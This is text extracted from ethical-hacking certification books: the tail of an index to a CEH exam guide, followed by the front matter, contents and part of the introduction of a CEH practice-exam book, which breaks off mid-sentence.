Trend Micro, 12 unicast, 152, 153, 157 overview, 379–380
Tribe Flood Network, 394 Unicode, 175, 251, 252 ransomware, 380–384

17-Index.indd 580 14/09/21 4:09 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Index

Index

581

software for creating, 380 entry points, 256–257 WEP keys, 286
WannaCry, 383–384 hacking, 256–261 WEPAttack, 296

vishing (voice phishing), 457 injection attacks, 237, WEPCrack, 296
Visual Trace tool, 81 257–259 whaling, 466
Visual Traceroute, 81 risks/vulnerabilities, 237–239 white hats, 26
VMs (virtual machines), 344, 346 server-side issues, 257, 262 white-box testing, 36, 488
voice phishing (vishing), 457 SQL injection, 263–267 whois tools, 74–77, 84
voice recognition, 220, 221 testing, 268 WiFi Analyzer, 297
VoIP systems, 62 types of attacks, 257–269 Wi-Fi connections, 314, 316
volumetric attacks, 392 web cache poisoning, 252–253 Wi-Fi hotspots, 287, 293, 314
VPN, 62 web defacement attacks, 253–254 Wi-Fi Protected Access. See WPA
VRFY command, 131 web front end servers, 243 WIGLE service, 290, 291
vulnerabilities. See also threats web mirroring, 66 WiMAX standard (802.16), 281

assessing, 487 web of trust, 427 windowing attacks, 396
categories of, 13–14 web organizations, 236–240 Windows 8, 122, 123
code/coding, 14, 308–309 web proxies, 119 Windows 10, 122
components, 239 web servers, 236–256. See also servers Windows Password Recovery
considerations, 14 Apache, 243, 245–247 tool, 212
insider threats, 460–462 architecture, 242–250 Windows root, 199
IoT, 306, 320–327 attacks on, 250–256 Windows scans, 113
known, 239 directory traversal, 250–252 Windows Server, 121
misconfiguration, 13 footprinting, 241–242 Windows Service Manager, 379
mobile devices, 307–315 hacking, 250–256 Windows systems
overview, 12–15 parameter tampering, 251 alternate data stream, 220–222
pen testing. See pen testing password cracking, 254 enumeration, 121–123
quantifying danger/risk of, 13 protecting, 269–270 hashing passwords, 191–195
resources/tools, 12–15 risks/vulnerabilities, 237–239, MMC, 197
scanning for. 247–250 NTFS file streaming, 220–221

See vulnerability scanning types of attacks, 250–256 password cracking, 190–195,
web applications, 237–239 types of servers, 243 210–215
web servers, 237–239, 247–250 web spiders, 58–59, 82, 241 password recovery tools, 212

vulnerability scanning, 119–121 web-based hacking, 235–277 registry, 195–197, 222, 223, 379
IoT, 329–330 web applications, 256–261 route tables, 197
overview, 119–120 web servers, 250–256 security, 190–198
tools for, 119–121 webcrawlers, 58–59 Trojans, 377–379
web servers, 241–242 WebGoat project, 239 Windows XP, 121

website footprinting, 66–67 WinDump sniffer, 164–165

W websites Winfingerprint, 128
clickjacking, 373–374 WinPcap, 145

W3C (World Wide Web company, 55–56 Wired Equivalent Privacy. See WEP
Consortium), 237 competitive intelligence on, Wired.com, 269

W3Techs, 243 55–56, 83 WireEdit tool, 175
Walker, Angie, 357 compromised, 373 wireless access points. See access points
Wall Street Transcript, 55 cookies. See cookies wireless adapters, 290
WAN Killer, 93 defacement attacks, 253–254 wireless antennas, 282–284
WannaCry attack, 383–384 dynamic web pages, 257 wireless attacks. See wireless hacking
war chalking, 284 fake, 292 wireless cards, 291
war driving, 290 increase in attacks, 268–269 wireless hacking, 289–298
war walking, 290 malware on. See malware discovery, 290–292
watches, smart, 317, 319 mirroring, 66, 242, 257 encryption attacks, 295–297
watermarks, digital, 422 scanning targets, 54 MAC spoofing, 295
waveforms, 281 spear phishing sites, 374 overview, 279–281
Wayback Machine, 66–67 traffic statistics, 56 rogue access points, 282
“wearables,” 317 Wayback Machine, 66–67 smartphones, 280, 290
Web 2.0, 257, 345 Website-Watcher, 67 sniffing, 297–298
web applications. See also applications WEP (Wired Equivalent Privacy), war chalking, 284

attack surface, 257 285–286, 289 war driving, 290
attacks on, 256–269 WEP attacks, 295–297 war walking, 290
considerations, 256 WEP cracking, 295–297 WEP attacks, 295–297

17-Index.indd 581 14/09/21 4:09 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Index

CEH Certified Ethical Hacker All-in-One Exam Guide

582

wireless jammers, 293–295 wireless standards, 280–281 XOR comparison, 99
wireless networks, 279–304 Wireshark sniffer, 131, 162–165, 297 XOR (exclusive-or) operation, 286,

802.11 standards, 280–281 wiretapping, 144, 153–154 412–413
access points. See access points World Wide Web Consortium XSS (cross-site scripting), 238,
ad hoc, 281, 293 (W3C), 237 260–261
antennas, 282–284 Worm Maker Thing, 384 XXE (XML External Entities), 238
architecture, 280–285 worm makers, 384
authentication, 284–285, 287, 297 worms, 383–385. See also viruses Y
basic setup, 281–282 WPA (Wi-Fi Protected Access),
basics, 280–285 287–289, 296–297 Yahoo, 60
Bluetooth, 280 WPA2 Enterprise, 287 YouTube, 57, 255
considerations, 280 WPA2 Personal, 287 Yubikey token, 475
encryption, 285–289, 295–297 WPA2 standard, 287–289, 296–297
finding/discovery, 290–292 WPA-3 encryption, 285 Z
hacking. See wireless hacking WPA-3 Enterprise, 285

zANTi, 115
identifying, 284, 290–292 wrappers, 374

ZDNet, 268
infrastructure mode, 281–282 wrapping attacks, 359

Zenmap, 104, 105, 111, 114, 133
modes, 281–282

Zephyr OS, 319
security, 282, 284–289 X zero-day attacks, 16, 21, 393
service set identifiers, 282, 284
standards, 280–281 X probe, 242 ZeuS-in-the-Mobile (ZitMo), 468

X.509 standard, 428 Zigbee Framework, 330
vehicle communications, 288
WEP. See WEP XArp tool, 159 Zigbee standard (802.15.4), 281

WPA, 287–289, 296–297 XMAS scan, 107, 109, 112 ZitMo (ZeuS-in-the-Mobile), 468

WPA2, 287–289, 296–297 XML (Extensible Markup Language), zombie computers, 392
114, 248 zombies, 31, 107–108, 468

wireless NICs, 282
Wireless Security Auditor tool, 296 XML External Entities (XXE), 238 zone file, 72

XML processors, 238 zone transfers, 70–72, 77, 78
wireless sniffing, 297–298

XOR ciphers, 413 zones, security, 11–12

17-Index.indd 582 14/09/21 4:09 PM






All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / FM / Blind Folio: i

™

CEH
Certified Ethical Hacker

Practice Exams
Fifth Edition

00-FM.indd 1 24/05/22 10:01 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / FM / Blind Folio: ii

ABOUT THE AUTHOR

Matt Walker is currently working multiple contracts in cyber security and network management.
An IT security and education professional for more than 20 years, he has served as the director of
the Network Training Center and a curriculum lead/senior instructor for Cisco Networking Acad-
emy on Ramstein AB, Germany, and as a network engineer for NASA’s Secure Network Systems
(NSS), designing and maintaining secured data, voice, and video networking for the agency. Matt
also worked as an instructor supervisor and senior instructor at Dynetics, Inc., in Huntsville, Ala-
bama, providing on-site certification-awarding classes for (ISC)2, Cisco, and CompTIA, and after
two years came right back to NASA as an IT security manager for UNITeS, SAIC, at Marshall
Space Flight Center. He has written and contributed to numerous technical training books for
NASA, Air Education and Training Command, and the U.S. Air Force, as well as commercially,
and he continues to train and write certification and college-level IT and IA security courses.

About the Technical Editor
Brad Horton currently works as an intelligence specialist with the U.S. Department of Defense.
Brad has worked as a security engineer, commercial security consultant, penetration tester, and
information systems researcher in both the private and public sectors. This has included work with
several defense contractors, including General Dynamics C4S, SAIC, and Dynetics, Inc. Brad
currently holds the Certified Information Systems Security Professional (CISSP), the CISSP–
Information Systems Security Management Professional (CISSP-ISSMP), the Certified Ethical
Hacker (CEH), and the Certified Information Systems Auditor (CISA) trade certifications. Brad
holds a bachelor’s degree in commerce and business administration from the University of Ala-
bama, a master’s degree in management of information systems from the University of Alabama
in Huntsville (UAH), and a graduate certificate in information assurance from UAH. When not
hacking, Brad can be found at home with his family or on a local golf course.

00-FM.indd 2 24/05/22 10:01 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / FM / Blind Folio: iii

™

CEH
Certified Ethical Hacker

Practice Exams
Fifth Edition

Matt Walker

New York Chicago San Francisco
Athens London Madrid Mexico City

Milan New Delhi Singapore Sydney Toronto

McGraw Hill is an independent entity from the International Council of E-Commerce Consultants® (EC-Council) and is not
affiliated with EC-Council in any manner. This study/training guide and/or material is not sponsored by, endorsed by, or affili-
ated with EC-Council in any manner. This publication and accompanying media may be used in assisting students to prepare
for the Certified Ethical Hacker (CEH™) exam. Neither EC-Council nor McGraw Hill warrants that use of this publication and
accompanying media will ensure passing any exam. CEH is a trademark or registered trademark of EC-Council in the United
States and certain other countries. All other trademarks are trademarks of their respective owners.

00-FM.indd 3 24/05/22 10:01 AM



Copyright © 2022 by McGraw Hill. All rights reserved. Except as permitted under the United States Copyright Act of 1976, no
part of this publication may be reproduced or distributed in any form or by any means, or stored in a database or retrieval system,
without the prior written permission of the publisher, with the exception that the program listings may be entered, stored, and
executed in a computer system, but they may not be reproduced for publication.

ISBN: 978-1-26-426997-6
MHID: 1-26-426997-8

The material in this eBook also appears in the print version of this title: ISBN: 978-1-26-426996-9,
MHID: 1-26-426996-X.

eBook conversion by codeMantra
Version 1.0

All trademarks are trademarks of their respective owners. Rather than put a trademark symbol after every occurrence of a trade-
marked name, we use names in an editorial fashion only, and to the benet of the trademark owner, with no intention of infringe-
ment of the trademark. Where such designations appear in this book, they have been printed with initial caps.

McGraw-Hill Education eBooks are available at special quantity discounts to use as premiums and sales promotions or for use in
corporate training programs. To contact a representative, please visit the Contact Us page at www.mhprofessional.com.

TERMS OF USE

This is a copyrighted work and McGraw-Hill Education and its licensors reserve all rights in and to the work. Use of this work
is subject to these terms. Except as permitted under the Copyright Act of 1976 and the right to store and retrieve one copy of the
work, you may not decompile, disassemble, reverse engineer, reproduce, modify, create derivative works based upon, transmit,
distribute, disseminate, sell, publish or sublicense the work or any part of it without McGraw-Hill Education’s prior consent. You
may use the work for your own noncommercial and personal use; any other use of the work is strictly prohibited. Your right to
use the work may be terminated if you fail to comply with these terms.

THE WORK IS PROVIDED “AS IS.” McGRAW-HILL EDUCATION AND ITS LICENSORS MAKE NO GUARANTEES
OR WARRANTIES AS TO THE ACCURACY, ADEQUACY OR COMPLETENESS OF OR RESULTS TO BE OBTAINED
FROM USING THE WORK, INCLUDING ANY INFORMATION THAT CAN BE ACCESSED THROUGH THE WORK VIA
HYPERLINK OR OTHERWISE, AND EXPRESSLY DISCLAIM ANY WARRANTY, EXPRESS OR IMPLIED, INCLUD-
ING BUT NOT LIMITED TO IMPLIED WARRANTIES OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR
PURPOSE. McGraw-Hill Education and its licensors do not warrant or guarantee that the functions contained in the work will
meet your requirements or that its operation will be uninterrupted or error free. Neither McGraw-Hill Education nor its licensors
shall be liable to you or anyone else for any inaccuracy, error or omission, regardless of cause, in the work or for any damages
resulting therefrom. McGraw-Hill Education has no responsibility for the content of any information accessed through the work.
Under no circumstances shall McGraw-Hill Education and/or its licensors be liable for any indirect, incidental, special, punitive,
consequential or similar damages that result from the use of or inability to use the work, even if any of them has been advised of
the possibility of such damages. This limitation of liability shall apply to any claim or cause whatsoever whether such claim or
cause arises in contract, tort or otherwise.



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / FM / Blind Folio: v

I dedicate this book to my father, Ronald Walker (1947–2008).
He was the best man I’ve ever met, and second place isn’t even close.

I miss you, Dad.

—Matthew Walker

00-FM.indd 5 24/05/22 10:01 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / FM / Blind Folio: vi

This page intentionally left blank

00-FM.indd 6 24/05/22 10:01 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / FM

CONTENTS AT A GLANCE

Chapter 1 Getting Started: Essential Knowledge . . . . . . . . . . . . . . . . . . . . . . . . . . .  1

Chapter 2 Reconnaissance: Inormation
Gathering or the Ethical Hacker . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  29

Chapter 3 Scanning and Enumeration . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  57

Chapter 4 Snifng and Evasion . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  85

Chapter 5 Attacking a System . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  111

Chapter 6 Web-Based Hacking: Servers and Applications . . . . . . . . . . . . . . . . . .  137

Chapter 7 Wireless Network Hacking . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  165

Chapter 8 Mobile Communications and the IoT . . . . . . . . . . . . . . . . . . . . . . . . . . .  187

Chapter 9 Security in Cloud Computing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  207

Chapter 10 Trojans and Other Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  227

Chapter 11 Cryptography 101 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  253

Chapter 12 Low Tech: Social Engineering and Physical Security . . . . . . . . . . . . . .  279

Chapter 13 The Pen Test: Putting It All Together . . . . . . . . . . . . . . . . . . . . . . . . . . .  305

Appendix About the Online Content . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  331

vii

00-FM.indd 7 24/05/22 10:01 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / FM / Blind Folio: viii

This page intentionally left blank

00-FM.indd 8 24/05/22 10:01 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / FM

CONTENTS

Acknowledgments . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  xi

Introduction . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  xiii

Chapter 1 Getting Started: Essential Knowledge . . . . . . . . . . . . . . . . . . . . . . . . . . .  1

Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  3
Quick Answer Key . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  8
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  9

Chapter 2 Reconnaissance: Inormation
Gathering or the Ethical Hacker . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  29

Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  31
Quick Answer Key . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  38
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  39

Chapter 3 Scanning and Enumeration . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  57

Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  59
Quick Answer Key . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  66
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  67

Chapter 4 Snifng and Evasion . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  85

Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  87
Quick Answer Key . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  93
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  94

Chapter 5 Attacking a System . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  111

Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  113
Quick Answer Key . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  120
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  121

Chapter 6 Web-Based Hacking: Servers and Applications . . . . . . . . . . . . . . . . . .  137

Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  139
Quick Answer Key . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  145
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  146

Chapter 7 Wireless Network Hacking . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  165

Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  167
Quick Answer Key . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  172
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  173

ix

00-FM.indd 9 24/05/22 10:01 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / FM

Chapter 8 Mobile Communications and the IoT . . . . . . . . . . . . . . . . . . . . . . . . . . .  187

Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  190
Quick Answer Key . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  194
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  195

Chapter 9 Security in Cloud Computing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  207

Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  209
Quick Answer Key . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  213
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  214

Chapter 10 Trojans and Other Attacks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  227

Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  229
Quick Answer Key . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  235
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  236

Chapter 11 Cryptography 101 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  253

Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  255
Quick Answer Key . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  261
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  262

Chapter 12 Low Tech: Social Engineering and Physical Security . . . . . . . . . . . . . .  279

Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  281
Quick Answer Key . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  287
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  288

Chapter 13 The Pen Test: Putting It All Together . . . . . . . . . . . . . . . . . . . . . . . . . . .  305

Questions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  307
Quick Answer Key . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  312
Answers . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  313

Appendix About the Online Content . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  331

System Requirements . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  331
Your Total Seminars Training Hub Account . . . . . . . . . . . . . . . . . . . . . . . . . . . .  331
Single User License Terms and Conditions . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  331
TotalTester Online . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  333
Technical Support . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .  333

Contents

x

00-FM.indd 10 24/05/22 10:01 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / FM

ACKNOWLEDGMENTS

I, like most of you, used to hardly ever read the acknowledgments portion of a book. When I
bought a book, I just wanted to get to the meat of the thing and see what I could drag out of
it—either intellectually or entertainment-wise—and couldn’t give a care about what the author
thought about those who helped put it all together. Then, of all things, I wrote a book.

Now, I read the acknowledgments section of every book I purchase. Why? Because having gone
through the trials and tribulations of writing, editing, arguing, planning, researching, rewriting,
screaming at a monitor, and restarting the whole thing all over again, I understand why it’s so
important. I know what it means when the writer says they “couldn’t have done it without fill-
in-the-blank.” Trust me, if it’s written there, then the author truly means they couldn’t have done
it without them. My fill-in-the-blanks deserve more than just a mention in an acknowledgments
section, though, because they really did make it all possible, and I most assuredly couldn’t have
done it without them.

My undying gratitude and heartfelt thanks go out to the entire team at McGraw Hill. Tim
Green originally roped me into this several years back, and without him I would have never even
thought of it. Caitlin Cromley-Linn and Lisa McClain provided the firm guidance that every
author needs to finish a product like this (okay, maybe not every author, but I sure needed it),
displayed the patience of Job, and had a great sense of humor during the whole ordeal. They
both deserve a vacation somewhere warm and beachy—I’ll get the first round of cold adult
beverages. Once again, thanks to everyone at McGraw Hill for providing me with the chance to
do something I dearly love, and for your patience with me in putting this all together.

Lastly, I can’t thank the technical editor, Brad Horton, enough. Brad makes a difficult
process—technically scrubbing everything to make sure it’s all in good order—not only bearable
but downright fun. His edits were spot on and were always designed to make this project the
absolute best it could be. He not only pointed out corrections when I messed something up but
added immeasurably to the real-world aspects of this book. I simply could not, would not, have
done this without him. It’s an honor to work with him and a great blessing in my life to call him
a friend.

xi

00-FM.indd 11 24/05/22 10:01 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / FM / Blind Folio: xii

This page intentionally left blank

00-FM.indd 12 24/05/22 10:01 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / FM

INTRODUCTION

Hello and welcome to the practice exams for Certified Ethical Hacker (CEH), now in
version 11. If you’re the proud owner of previous editions of this book or its companion book,
CEH™ Certified Ethical Hacker All-in-One Exam Guide, Fifth Edition, welcome back! If not and
you’re just picking this book up for the first time to see whether it’s for you, settle in for a moment
and let’s cover a few really important items.

Some of you may be curious about what a “hacking” study guide looks like, or you may be
thinking about attempting a new certification or career choice. Some of you may have already
taken that decisive leap and started down the path, and are now looking for the next resource to
help you along the journey. And some of you reading this may even be simply looking for some
credentials for your career—most in this group are true professionals who already know how to do
this job and are just finally ready to get the certification knocked out, while a small few are simply
looking for a résumé bullet (one more certification you can put on your e-mail signature line to
impress others).

Regardless of where you stand in your career or your desire for this certification, there are a
couple of things I need to clear the air about before you commit to purchasing and reading this
book. First (before I get to the bad stuff ), I firmly believe this book will assist you in attaining your
CEH certification. The entire team involved in this effort has spent a lot of time, energy, thought,
research, and bourbon on producing what we think is the best companion resource guide on the
market. I’m proud of it and proud to have been associated with the professionals who helped put
it together.

That said, if you’re looking for a silver bullet—a virtual copy of the exam so you can simply
memorize, go take the test, and forget about it—please stop reading now and go take your chances
elsewhere. Part of the ethics of attaining, and maintaining, a CEH credential is the nondisclosure
agreement all candidates sign before attempting the exam. I, and everyone else involved in this
project, have taken great pains to provide you with examples of questions designed to test your
knowledge of the subject at hand, not to provide you with questions to memorize. Those who
are looking for that, and use that method to attain the certification, belittle and cheapen the hard
work the community puts into this, and I would be sickened to know of anyone using this work
for that purpose.

If you want to pass this exam and have the respect and benefits that come along with holding
the certification, you better know how to do the job. The memorization/test-taking junkies out
there may get an interview or two with this certification on their résumé, but trust me, they’ll
be discovered as frauds before they ever get to round 2. This community knows the difference
between a contender and a pretender, so don’t try to take shortcuts. Learn the material. Become
an expert in it. Then go take the exam. If you’re not willing to put in the effort, maybe you should
pick up another line of work—like professional dodge ball player or pharmaceutical test subject.
To quote a really bad but totally awesome 1980s movie, “There’s always barber college.”

xiii

00-FM.indd 13 24/05/22 10:01 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / FM

With all that out of the way—and now that I’m talking to the real candidates for this
certification—once again I firmly believe this book will help you in your attempt to attain the
certification. As always, however, I must provide a word of caution: relying on a single book—any
single book—to pass this exam is a recipe for disaster. Yes, this is a great resource, and you should
definitely buy it (right now—don’t wait!). However, you simply will not pass this exam without the
time and benefit that can come only from experience. As a matter of fact, EC-Council requires
candidates sitting for the exam to have at least two years of IT security–related experience. Bolster
your study in this book with practice, practice, and more practice. You’ll thank me for it later.

Lastly, keep in mind this certification isn’t a walk in the park. CEH didn’t gain the reputation
and value it has by being easy to attain. Its worth has elevated it as one of the top certifications
a technician can attain and is now part of DoD 8570’s call for certification on DoD networks.
In short, this certification actually means something to employers because they know the effort it
takes to attain it.

The exam itself is a four-hour, 125-question grueling marathon that will leave you exhausted
when you click the Finish button. EC-Council offers a handbook (as of this writing, located at
https://cert.eccouncil.org/images/doc/CEH-Handbook-v5.pdf) that provides all you’ll need to
know about qualifications, content, and other information about the exam and certification. I’ve
included some highlights in the following sections, detailing the exam and what you’ll need.

Training and Preparation
There are two ways for a candidate to attain CEH certification: with training and using only self-
study. Per the EC-Council site (https://iclass.eccouncil.org/learning-options/), training options
include the following:

• MasterClass Live Online This is a “live, online, instructor-led training course, which
means you can attend a course with a live instructor from anywhere with an internet
connection.” Also, per the site: “Our Virtual Classroom training combines our live,
virtual cyber range, real-world instructors, content, exercises and peer collaboration to
give you the best chance at certification and the biggest return on your investment.”

• MasterClass In Person This is exactly what it sounds like: a class provided by an
affiliate in cities throughout North America. The site describes this training option
as follows: “Instructor-led training in your own town is offered to provide you world
class instruction conveniently located in your backyard, and since the course is live,
you will collaborate with your peers and gain real-world skills while receiving in-person
instruction and interaction.”

• Self-Paced Directly from the site, this solution is “an asynchronous, self-study
environment which delivers EC-Council’s sought after IT Security training courses,
such as CEH, in a streaming video format. All lectures are delivered by a professional
practitioner to assure a real-world perspective on the course concepts…and provides
the benefits of classroom training at your own pace.” This also comes with the official
courseware via Aspen as well as six months of access to iLabs (EC-Council’s virtual lab
platform).

Introduction

xiv

00-FM.indd 14 24/05/22 10:01 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / FM

• Certification Club For one U.S. dollar short of $3,000, you can join the iClass
Club, where you’ll “receive one full certification course as well as unlimited EC-Council
certification courses for only $499 during the subscription year and you decide whether
to train in either live online or self-paced online format, or even mix and match.”
In short, you’ll have access to a wide range of videos and training materials from
EC-Council, and can mix and match whatever training methods over however long
a timeframe you wish.

• Textbook Learning (self-study) If you want to study on your own and don’t care
about the class at all (that is, you’ve been doing this for a while and don’t see the value
of going to a class to have someone teach you what you already know), you can simply
buy the courseware (for $877 as of this writing) and study on your own. There are all the
necessary hoops and hurdles to step through to qualify for the exam, but EC-Council is
certainly happy to sell you their official curriculum and let you take your own chances.

The Examination
For this version, EC-Council retains the exam scoring methods and mechanisms (https://www
.eccouncil.org/programs/certified-ethical-hacker-ceh/) from the last version. The content itself
hasn’t changed much, other than new content we’ve covered in this book; however, the method to
tabulate whether or not you pass the exam definitely has.

The exam is a four-hour, computer-based proctored test (in other words, it’s taken in person
at an authorized testing facility) that allows you to skip and mark questions to revisit at the end
of each section. FAQs regarding the exam itself are updated continually and are located at https://
cert.eccouncil.org/faq.html. Your exam score is tabulated immediately after completion, so be
sure to review everything before clicking Finish. Unlike previous versions, however, there is no
cut-and-dry number of questions you need to get right and no score you need to attain. Whereas
in versions previous you needed to answer 70 percent of the questions correctly, you now need to
attain the appropriate “cut score” for your particular test bank. I know, I know—you’re wondering
what that means. I did, too, so I read up on it for you (you’re welcome).

CEH is provided to candidates as a series of multiple-test blocks of questions—in other words,
a candidate sitting on the left side of the room might get questions from block 1, while someone
on the right side might get questions from block 2 (or block 3, block 4, and so on). EC-Council
refers to these question banks as “forms” and has calculated a passing score based on the difficulty
rating of each block. Should you sit down and randomly get assigned an easy form, you’ll have
to score upward of 85 percent to pass; a hard one, and you’ll only need 60 percent. See? Isn’t that
fun and easy?

Lastly, I found this little nugget of information very enlightening and wanted to include it here
both to inform you and to validate something I’ve been saying for years now (in previous versions
of these books, as well as in this one): EC-Council openly admits their exam content and creation
are performed separately from course and curriculum content creation. This means the people
creating the test questions don’t necessarily use the official course curriculum. In other words, you
can and will see questions on your exam that aren’t even mentioned in the courseware or in your
classroom—or, dare I say, in the study material you’re looking at here.

Introduction

xv

00-FM.indd 15 24/05/22 10:01 AM



All-In-One_PE / CEH™ Certifed Ethical Hacker Practice Exams, 5e / Matt Walker / 996-X / FM

To some of us, myself included, this seems odd. I mean, if you require folks to purchase
your courseware and/or sit for your specific training classes, you’d assume those would be the
